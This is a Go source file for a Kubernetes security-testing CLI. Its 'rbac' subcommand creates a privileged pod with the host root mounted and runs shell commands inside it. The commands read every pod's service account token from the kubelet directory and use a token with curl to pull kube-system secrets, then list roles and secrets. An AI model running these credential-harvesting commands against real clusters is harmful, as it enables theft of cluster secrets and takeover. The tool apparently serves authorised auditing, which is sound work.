package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	app "main/internal/app"
	"time"

	"github.com/spf13/cobra"

	_ "k8s.io/client-go/plugin/pkg/client/auth"
)

var rbacCmd = &cobra.Command{
	Use:   "rbac",
	Short: "Run single rbac test (creates privileged pod, mounts host root, execs checks)",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg, clientset, err := app.GetKubeconfig(kubeconfig)
		if err != nil {
			fmt.Println(err)
		}

		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		commands := [][]string{
			// {"kubectl", "run", "debug", "--image=alpine", "--restart=Never", "--", "/bin/sh", "-c", "ls && exit"},
			{"/bin/sh", "-c", "cat /proc/self/mounts | grep -E 'volume|kubernetes.io'"},
			{"/bin/sh", "-c", "find /hostroot/var/lib/kubelet/pods/ -name volumes -type d 2>/dev/null"},
			{"/bin/sh", "-c", "for i in `ls /hostroot/var/lib/kubelet/pods/`; do cat /hostroot/var/lib/kubelet/pods/$i/volumes/kubernetes.io~projected/*/token; done >/dev/null 2>&1"},
			{"KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets"},
		}

		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper)
		if err != nil {
			fmt.Println(err)
		}

		results = app.KubeCanIList(ctx, namespace, clientset, results)
		app.Stopper(stopper, "KubeCanIList")
		results = app.GetKubeRoles(ctx, namespace, clientset, results)
		app.Stopper(stopper, "GetKubeRoles")
		results = app.GetKubeSecrets(ctx, clientset, results)
		app.Stopper(stopper, "GetKubeSecrets")

		out := map[string]interface{}{
			"results": results,
		}
		enc, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(enc))
		return nil
	},
}

func init() {
	rootCmd.AddCommand(rbacCmd)

	rbacCmd.Flags().StringVar(&kubeconfig, "kubeconfig", "", "path to kubeconfig file (default KUBECONFIG or $HOME/.kube/config)")
	rbacCmd.Flags().StringVarP(&namespace, "namespace", "n", "default", "namespace for test pod")
	rbacCmd.Flags().StringVarP(&image, "image", "i", "nicolaka/netshoot:latest", "image to use for test pod")
	rbacCmd.Flags().DurationVarP(&timeout, "timeout", "t", 3*time.Minute, "overall timeout for the test")
	rbacCmd.Flags().BoolVarP(&stopper, "stopper", "s", false, "waits for the user to press a key after each command is executed, allowing them to be executed step by step")
}
